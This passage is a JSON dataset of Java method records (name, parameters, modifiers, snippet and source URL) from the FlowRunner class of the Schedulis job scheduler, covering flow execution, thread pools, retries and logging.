"throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setCycleFlowRunnerEventListener(EventListener cycleFlowRunnerEventListener) {    this.cycleFlowRunnerEventListener = cycleFlowRunnerEventListener;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setFlowWatcher", "params": ["FlowWatcher"], "throws": null, "modifiers": ["public"], "return_type": "FlowRunner", "snippet": "  public FlowRunner setFlowWatcher(final FlowWatcher watcher) {    this.watcher = watcher;    return this;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setNumJobThreads", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "FlowRunner", "snippet": "  public FlowRunner setNumJobThreads(final int jobs) {    this.numJobThreads = jobs;    return this;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setJobLogSettings", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "FlowRunner", "snippet": "  public FlowRunner setJobLogSettings(final String jobLogFileSize, final int jobLogNumFiles) {    this.jobLogFileSize = jobLogFileSize;    this.jobLogNumFiles = jobLogNumFiles;    return this;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setValidateProxyUser", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "FlowRunner", "snippet": "  public FlowRunner setValidateProxyUser(final boolean validateUserProxy) {    this.validateUserProxy = validateUserProxy;    return this;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getExecutionDir", "params": [], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "  public File getExecutionDir() {    return this.execDir;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getAlerterHolder", "params": [], "throws": null, "modifiers": [], "return_type": "AlerterHolder", "snippet": "  AlerterHolder getAlerterHolder() {    return this.alerterHolder;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "shutdownNow", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void shutdownNow(){    kill();    logger.info(\"killed all job process.\");    if (this.executorService != null) {      logger.info(\"shutdown executorService.\");      this.executorService.shutdown();    }    if (this.executorServiceForCheckers != null) {      logger.info(\"shutdown executorServiceForCheckers.\");      this.executorService.shutdown();    }    if (this.executorPriorityService != null){      logger.info(\"shutdown executorPriorityService.\");      this.executorPriorityService.shutdown();    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "createThreadPool", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void createThreadPool(){    if (this.executorService == null) {      logger.info(\"create executorService. execId:\" + execId);      ThreadFactory threadFactory1 = new ThreadFactoryBuilder().setDaemon(true).build();      this.executorService = new ThreadPoolExecutor(this.numJobThreads, this.numJobThreads,          0L, TimeUnit.MILLISECONDS,          new LinkedBlockingQueue<Runnable>(1024 * 100), threadFactory1);    }    if (this.executorServiceForCheckers == null) {      logger.info(\"create executorServiceForCheckers. execId:\" + execId);      ThreadFactory threadFactory2 = new ThreadFactoryBuilder().setDaemon(true).build();      int size = azkabanProps.getInt(\"checkers.num.threads\", 10);      this.executorServiceForCheckers = new ThreadPoolExecutor(size, size,          0L, TimeUnit.MILLISECONDS,          new LinkedBlockingQueue<Runnable>(1024 * 100), threadFactory2);    }    if (this.executorPriorityService == null){      logger.info(\"create executorPriorityService. execId:\" + execId);      ThreadFactory threadFactory3 = new ThreadFactoryBuilder().setDaemon(true).build();      this.executorPriorityService = Executors.newSingleThreadExecutor(threadFactory3);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "initNSWTSSValue", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void initNSWTSSValue(){    Props flowProp = this.sharedProps.get(this.flow.getExecutableNode(((ExecutableFlowBase)flow).getStartNodes().get(0)).getPropsSource());    String flowParamNsWtss = this.flow.getExecutionOptions().getFlowParameters().getOrDefault(\"ns_wtss\", null);    String flowPropNswtss = flowProp == null ? null: flowProp.getString(\"ns_wtss\", null);    if(flowParamNsWtss != null && flowParamNsWtss.equals(\"false\")){      this.flow.setNsWtss(false);    } else if(flowPropNswtss != null && flowPropNswtss.equals(\"false\")){      this.flow.setNsWtss(false);    }    logger.info(\"nsWtss: \" + this.flow.getNsWtss() + \", flowParamNsWtss: \" + flowParamNsWtss + \", flowPropNswtss:\" + flowPropNswtss);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "alertOnIMSRegistStart", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void alertOnIMSRegistStart(){    try {      // \u6ce8\u518c\u5e76\u4e0a\u62a5\u4f5c\u4e1a\u6d41\u5f00\u59cb      Alerter mailAlerter = ServiceProvider.SERVICE_PROVIDER.getInstance(AlerterHolder.class).get(\"email\");      if(mailAlerter == null){        logger.warn(\"\u627e\u4e0d\u5230\u544a\u8b66\u63d2\u4ef6.\");      }      mailAlerter.alertOnIMSRegistStart(this.flow, this.sharedProps, logger);    } catch (Exception e) {      logger.error(\"The flow report IMS faild in the end {} \"+e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "alertOnIMSRegistFinish", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void alertOnIMSRegistFinish(){    try {      // \u4e0a\u62a5\u4f5c\u4e1a\u6d41\u5f00\u59cb      Alerter mailAlerter = ServiceProvider.SERVICE_PROVIDER.getInstance(AlerterHolder.class).get(\"email\");      if(mailAlerter == null){        logger.warn(\"\u627e\u4e0d\u5230\u544a\u8b66\u63d2\u4ef6.\");      }      mailAlerter.alertOnIMSRegistFinish(this.flow, this.sharedProps, this.logger);    }catch (Exception e) {      logger.error(\"The flow report IMS faild in the end {} \"+e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "run", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void run() {    try {\t  // FIXME\u00a0Create a thread pool and add a thread pool (executorServiceForCheckers) for running checker tasks.      createThreadPool();      this.logger.info(\"Fetching job and shared properties.\");      if (!FlowLoaderUtils.isAzkabanFlowVersion20(this.flow.getAzkabanFlowVersion())) {        loadAllProperties();        initNSWTSSValue();      }      // FIXME New function, reporting job stream status to IMS, relying on third-party services.      alertOnIMSRegistStart();      // FIXME\u00a0Global variable settings for job runs.      setSubmitUserProps(this.flow.getSubmitUser());      // \u8bbe\u7f6e\u7cfb\u7edf\u5185\u7f6e\u53d8\u91cf      setupFlowExecution();      this.flow.setStartTime(System.currentTimeMillis());      this.logger.info(\"Updating initial flow directory.\");      updateFlow();      //\u83b7\u53d6\u6267\u884cFlow\u8282\u70b9      ExecutableFlow ef = this.flow;      // FIXME\u00a0New feature, replace the run_date variable in the file before the job stream starts running.      SystemBuiltInParamJodeTimeUtils sbipu = new SystemBuiltInParamJodeTimeUtils();      if(null == ef.getParentFlow()){        sbipu.run(this.execDir.getPath(), ef);      }      this.fireEventListeners(              Event.create(this, EventType.FLOW_STARTED, new EventData(this.getExecutableFlow())));      // FIXME\u00a0When the task is submitted to the executor queue and the task status is preparing, the execution is terminated by the user, which causes the job stream to be in the killing state and cannot be turned to the killed state.      if(this.flowKilled){        logger.info(this.flow.getExecutionId() + \" was killed. \");        this.flow.setStatus(Status.KILLED);      } else {        runFlow();      }    } catch (final Throwable t) {      if (this.logger != null) {        this.logger                .error(                        \"An error has occurred during the running of the flow. Quiting.\",                        t);      }      this.flow.setStatus(Status.FAILED);    } finally {      try {        // FIXME New function, reporting job stream status to IMS, relying on third-party services.        alertOnIMSRegistFinish();        if (this.watcher != null) {          this.logger.info(\"Watcher is attached. Stopping watcher.\");          this.watcher.stopWatcher();          this.logger                  .info(\"Watcher cancelled status is \" + this.watcher.isWatchCancelled());        }        this.flow.setEndTime(System.currentTimeMillis());        this.logger.info(\"Setting end time for flow \" + this.execId + \" to \"                + System.currentTimeMillis());        if (this.executorServiceForCheckers != null) {          logger.info(\"shutdown the thread pool, current active threads : \" + this.executorServiceForCheckers.getActiveCount());          this.executorServiceForCheckers.shutdown();        }        closeLogger();        updateFlow();      } finally {        this.fireEventListeners(                Event.create(this, EventType.FLOW_FINISHED, new EventData(this.flow)));        // In polling model, executor will be responsible for sending alerting emails when a flow        // finishes.        // Todo jamiesjc: switch to event driven model and alert on FLOW_FINISHED event.        if (this.azkabanProps.getBoolean(ConfigurationKeys.AZKABAN_POLL_MODEL, false)) {          // \u901a\u7528\u544a\u8b66\u548csla\u544a\u8b66          ExecutionControllerUtils.alertUserOnFlowFinished(this.flow, this.alerterHolder,                  ExecutionControllerUtils.getFinalizeFlowReasons(\"Flow finished\", null));        }      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setSubmitUserProps", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setSubmitUserProps(String userName){    try {      //\u5bf9\u4e8e\u5faa\u73af\u6267\u884c\u7279\u6b8a\u5904\u7406      if (this.flow.getFlowType() == 4) {        ExecutionCycle cycleFlow = this.executorLoader.getExecutionCycleFlow(String.valueOf(flow.getProjectId()), flow.getFlowId());        String submitUser = cycleFlow.getSubmitUser();        this.flow.setUserProps(this.executorLoader.getUserVariableByName(submitUser));      } else {        this.flow.setUserProps(this.executorLoader.getUserVariableByName(userName));      }    } catch (ExecutorManagerException em){      logger.error(\"\u83b7\u53d6\u7528\u6237\u53d8\u91cf\u5931\u8d25\" + em);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "getAzkabanProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props getAzkabanProps() {    return azkabanProps;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setupFlowExecution", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setupFlowExecution() {    final int projectId = this.flow.getProjectId();    final int version = this.flow.getVersion();    final String flowId = this.flow.getFlowId();    final Map<String, String> repeatMap = this.flow.getRepeatOption();    Props commonFlowProps;    // FIXME\u00a0New feature: if it is a historical rerun task, other built-in date variables are calculated based on the historical rerun date.    if(!repeatMap.isEmpty() && \"RepeatFlow\".equals(repeatMap.get(\"RepeatType\"))){      long repeatTime = Long.valueOf(repeatMap.get(\"startTimeLong\"));      commonFlowProps = FlowUtils.addRepeatCommonFlowProperties(null, repeatTime, this.flow);    }else{      // Add a bunch of common azkaban properties \u7ed9prop\u6587\u4ef6\u6dfb\u52a0\u53c2\u6570      commonFlowProps = FlowUtils.addCommonFlowProperties(null, this.flow);    }    if (FlowLoaderUtils.isAzkabanFlowVersion20(this.flow.getAzkabanFlowVersion())) {      final Props flowProps = loadPropsFromYamlFile(this.flow.getId());      if (flowProps != null) {        flowProps.setParent(commonFlowProps);        commonFlowProps = flowProps;      }    } else {      if (this.flow.getJobSource() != null) {        final String source = this.flow.getJobSource();        final Props flowProps = this.sharedProps.get(source);        flowProps.setParent(commonFlowProps);        commonFlowProps = flowProps;      }    }    // If there are flow overrides, we apply them now.    final Map<String, String> flowParam =            this.flow.getExecutionOptions().getFlowParameters();    if (flowParam != null && !flowParam.isEmpty()) {      commonFlowProps = new Props(commonFlowProps, flowParam);    }    this.flow.setInputProps(commonFlowProps);    if (this.watcher != null) {      this.watcher.setLogger(this.logger);    }    // Avoid NPE in unit tests when the static app instance is not set    if (AzkabanExecutorServer.getApp() != null) {      this.logger              .info(\"Assigned executor : \" + AzkabanExecutorServer.getApp().getExecutorHostPort());    }    this.logger.info(\"Running execid:\" + this.execId + \" flow:\" + flowId + \" project:\"            + projectId + \" version:\" + version);    if (this.pipelineExecId != null) {      this.logger.info(\"Running simulateously with \" + this.pipelineExecId              + \". Pipelining level \" + this.pipelineLevel);    }    // The current thread is used for interrupting blocks    this.flowRunnerThread = Thread.currentThread();    this.flowRunnerThread.setName(\"FlowRunner-exec-\" + this.flow.getExecutionId());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "updateFlow", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void updateFlow() {    updateFlow(System.currentTimeMillis());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "updateFlow", "params": ["long"], "throws": null, "modifiers": ["synchronized", "private"], "return_type": "void", "snippet": "  private synchronized void updateFlow(final long time) {    try {      this.flow.setUpdateTime(time);      this.executorLoader.updateExecutableFlow(this.flow);    } catch (final Exception e) {      this.logger.error(\"Error updating flow.\", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "createLogger", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void createLogger(final String flowId) {    // Create logger    final String loggerName = this.execId + \".\" + flowId;    this.logger = Logger.getLogger(loggerName);    // Create file appender    final String logName = \"_flow.\" + loggerName + \".log\";    this.logFile = new File(this.execDir, logName);    final String absolutePath = this.logFile.getAbsolutePath();    this.flowAppender = null;    try {      this.flowAppender = new FileAppender(this.loggerLayout, absolutePath, false);      this.logger.addAppender(this.flowAppender);    } catch (final IOException e) {      this.logger.error(\"Could not open log file in \" + this.execDir, e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "closeLogger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void closeLogger() {    if (this.logger != null) {      this.logger.removeAppender(this.flowAppender);      this.flowAppender.close();      try {        this.executorLoader.uploadLogFile(this.execId, \"\", 0, this.logFile);      } catch (final ExecutorManagerException e) {        e.printStackTrace();      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "loadAllProperties", "params": [], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void loadAllProperties() throws IOException {    // First load all the properties    this.flow.getPropsSource();    for (final FlowProps fprops : this.flow.getFlowProps()) {      final String source = fprops.getSource();      final File propsPath = new File(this.execDir, source);      final Props props = new Props(null, propsPath);      this.sharedProps.put(source, props);      if(source.contains(\"priority.properties\")){        this.flow.setOutputProps(props);      }    }    // Resolve parents    for (final FlowProps fprops : this.flow.getFlowProps()) {      if (fprops.getInheritedSource() != null) {        final String source = fprops.getSource();        final String inherit = fprops.getInheritedSource();        final Props props = this.sharedProps.get(source);        final Props inherits = this.sharedProps.get(inherit);        props.setParent(inherits);      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "runFlow", "params": [], "throws": ["Exception"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void runFlow() throws Exception {    this.logger.info(\"Starting flows\");    runReadyJob(this.flow);    updateFlow();    while (!this.flowFinished) {      synchronized (this.mainSyncObj) {        if (this.flowPaused) {          try {            this.mainSyncObj.wait(CHECK_WAIT_MS);          } catch (final InterruptedException e) {          }          continue;        } else {          if (this.retryFailedJobs) {            retryAllFailures();          } else if (!progressGraph()) {            try {              this.mainSyncObj.wait(CHECK_WAIT_MS);            } catch (final InterruptedException e) {            }          }        }      }    }    this.logger.info(\"Finishing up flow. Awaiting Termination\");    this.executorService.shutdown();    updateFlow();    this.logger.info(\"Finished Flow\");  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "retryAllFailures", "params": [], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void retryAllFailures() throws IOException {    this.logger.info(\"Restarting all failed jobs\");    this.retryFailedJobs = false;    this.flowKilled = false;    this.flowFailed = false;    this.flow.setStatus(Status.RUNNING);    final ArrayList<ExecutableNode> retryJobs = new ArrayList<>();    resetFailedState(this.flow, retryJobs);    for (final ExecutableNode node : retryJobs) {      this.logger.info(\"retryJob: \" + node.getId() + \",\" + node.getStatus() + \", baseflow: \" + (node instanceof ExecutableFlowBase));      if (node.getStatus() == Status.READY              || node.getStatus() == Status.DISABLED) {        runReadyJob(node);      } else if (Status.isSucceeded(node.getStatus())) {        for (final String outNodeId : node.getOutNodes()) {          final ExecutableFlowBase base = node.getParentFlow();          runReadyJob(base.getExecutableNode(outNodeId));        }      }      runReadyJob(node);    }    updateFlow();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "skippedAllFailures", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String skippedAllFailures(String user) {    this.logger.info(\"skipped all failures jobs by \" + user);    if(this.flowKilled){      logger.warn(\"flow has been killed, can not skipped the failed jobs\");      return \"\u4f5c\u4e1a\u6d41\u5df2\u88abkilled\uff0c\u4e0d\u80fd\u6267\u884c\u8df3\u8fc7\u4efb\u52a1\u3002\";    }    synchronized (this.mainSyncObj){      if(this.flowKilled){        logger.warn(\"flow has been killed, can not skipped the failed jobs\");        return \"\u4f5c\u4e1a\u6d41\u5df2\u88abkilled\uff0c\u4e0d\u80fd\u6267\u884c\u8df3\u8fc7\u4efb\u52a1\u3002\";      }      stopKillFlowTrigger();      if(FlowRunner.this.failureAction == FailureAction.FAILED_PAUSE) {        List<String> nodes = new ArrayList<>();        for(ExecutableNode node: this.failedNodes.values()){          if(node.getStatus().equals(Status.FAILED_WAITING)){            //\u8fd8\u539fflow\u72b6\u6001\u4e3aRunning            resetFlowStatus(node.getParentFlow(), node);            node.setStatus(Status.FAILED_SKIPPED);            node.setUpdateTime(System.currentTimeMillis());            FlowRunner.this.finishedNodes.add(node);            nodes.add(node.getNestedId());            logger.info(String.format(\"job: %s, old status: %s -> new status %s.\", node.getNestedId(), \"FAILED_WAITING\", node.getStatus()));          }        }        updateFlow();        for (String nodeName : nodes) {          this.failedNodes.remove(nodeName);        }      }    }    interrupt();    return \"\u5df2\u6267\u884c\u8df3\u8fc7\u8fc7\u6240\u6709FAILED_WAITING\u72b6\u6001job\";  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "retryFailedJobs", "params": ["List<String>"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String retryFailedJobs(List<String> retryFailedJobs) throws Exception {    if(this.flowKilled){      logger.warn(\"flow has been killed, can not skipped the failed jobs\");      return \"\u4f5c\u4e1a\u6d41\u5df2\u88abkilled\uff0c\u4e0d\u80fd\u91cd\u8bd5\u4efb\u52a1\u3002\";    }    synchronized (this.mainSyncObj) {      if(this.flowKilled){        logger.warn(\"flow has been killed, can not skipped the failed jobs\");        return \"\u4f5c\u4e1a\u6d41\u5df2\u88abkilled\uff0c\u4e0d\u80fd\u91cd\u8bd5\u4efb\u52a1\u3002\";      }      ExecutableNode targetNode = this.flow.getExecutableNodePath(retryFailedJobs.get(0));      if(targetNode != null && !targetNode.getStatus().equals(Status.FAILED_WAITING)){        logger.warn(\"job:\" + targetNode.getNestedId() + \"\u4e0d\u662fFAILED_WAITING\uff0c\u4e0d\u80fd\u91cd\u8bd5\u3002\");        return \"job:\" + targetNode.getNestedId() + \"\u4e0d\u662fFAILED_WAITING\uff0c\u4e0d\u80fd\u91cd\u8bd5\u3002\";      }      stopKillFlowTrigger();      resetFlowStatus(targetNode.getParentFlow(), targetNode);      for (String nodePath : retryFailedJobs) {        final ExecutableNode node = this.flow.getExecutableNodePath(nodePath);        if (!node.getStatus().equals(Status.FAILED_WAITING)) {          logger.warn(\"job:\" + node.getNestedId() + \"\u4e0d\u662fFAILED_WAITING\uff0c\u4e0d\u80fd\u91cd\u8bd5\u3002\");          return \"job:\" + node.getNestedId() + \"\u4e0d\u662fFAILED_WAITING\uff0c\u4e0d\u80fd\u91cd\u8bd5\u3002\";        }        this.logger.info(\"Restarting failed job: \" + nodePath);        this.flowKilled = false;        this.flowFailed = false;        node.resetForRetry();        if ((node.getStatus() == Status.READY                || node.getStatus() == Status.DISABLED)) {          runReadyJob(node);        }      }      updateFlow();      return null;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setFlowFailed", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFlowFailed(final boolean flowFailed){    logger.info(\"setting flow: \" + this.flow.getExecutionId() + \" \" + flowFailed);    this.flowFailed = flowFailed;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "jobSkippedHandle", "params": ["ExecutableNode", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void jobSkippedHandle(ExecutableNode node, String user){    if(node instanceof ExecutableFlowBase){      if(node.getStatus().equals(Status.READY)){        setJobSkipped(node, user);      } else {        for(ExecutableNode chiledNode: ((ExecutableFlowBase) node).getExecutableNodes()){          jobSkippedHandle(chiledNode, user);        }      }    } else {      setJobSkipped(node, user);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setJobSkipped", "params": ["ExecutableNode", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setJobSkipped(ExecutableNode node, String user){    if (node.getStatus().equals(Status.READY)) {      logger.info(\"setting job:\" + node.getNestedId() + \" status \" + node.getStatus().toString() + \" to status disabled.\");      node.setStatus(Status.DISABLED);      node.setUpdateTime(System.currentTimeMillis());    } else if (Status.isStatusRunning(node.getStatus())) {      for (JobRunner jobRunner : this.activeJobRunners) {        if (jobRunner.getNode().getNestedId().equals(node.getNestedId())) {          logger.info(\"setting job:\" + node.getNestedId() + \" status \" + node.getStatus().toString() + \" to skipped.\");          jobRunner.skippedJob(user);        }      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setJobDisabled", "params": ["String", "Map<String,Object>", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setJobDisabled(String nodePath, Map<String, Object> respMap, String user) throws ExecutorManagerException{    logger.info(\"disable job: \" + this.flow.getExecutionId() + \", \" + nodePath);    if(this.flowKilled || this.flowFinished){      logger.warn(\"flow has been killed or finished, can not skipped the failed jobs\");      respMap.put(ConnectorParams.RESPONSE_ERROR, \"\u8bbe\u7f6e\u5931\u8d25\uff0c\u4f5c\u4e1a\u6d41\u5df2\u7ecfkilled\u6216\u8005finished\u3002\");      return;    }    synchronized (this.mainSyncObj) {      ExecutableNode node = this.flow.getExecutableNodePath(nodePath);      if(this.flowKilled || this.flowFinished){        logger.warn(\"flow has been killed or finished, can not skipped the failed jobs\");        respMap.put(ConnectorParams.RESPONSE_ERROR, \"\u8bbe\u7f6e\u5931\u8d25\uff0c\u4f5c\u4e1a\u6d41\u5df2\u7ecfkilled\u6216\u8005finished\u3002\");      } else if(node == null){        logger.warn(\"job: \" + this.flow.getExecutionId() + \", \" + nodePath + \" is not exists.\");        respMap.put(ConnectorParams.RESPONSE_ERROR, \"job: \" + this.flow.getExecutionId() + \", \" + nodePath + \" is not exists.\");      } else if(Status.isStatusFinished(node.getStatus())) {        logger.warn(\"job: \" + nodePath + \" is not running.\");        respMap.put(ConnectorParams.RESPONSE_ERROR, \"\u8bbe\u7f6e\u5931\u8d25, \u4efb\u52a1\u53ef\u80fd\u5df2\u7ecf\u6267\u884c\u5b8c\u6210\u3002\");      } else {        jobSkippedHandle(node, user);        updateFlow();      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setFlowFailed", "params": ["JSONObject"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean setFlowFailed(final JSONObject json){    boolean flowFailed = json.getBooleanValue(\"flowFailed\");    boolean ret = true;    synchronized (this.mainSyncObj) {      if (!this.flowFinished && this.flowPaused) {        this.setFlowFailed(flowFailed);        this.flowPaused = false;      } else {        this.logger.warn(\"this flow:\" + this.flow.getExecutionId() + \" is not paused or has finished.\");        ret = false;      }      interrupt();    }    return ret;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "progressGraph", "params": [], "throws": ["IOException"], "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean progressGraph() throws IOException {    this.finishedNodes.swap();    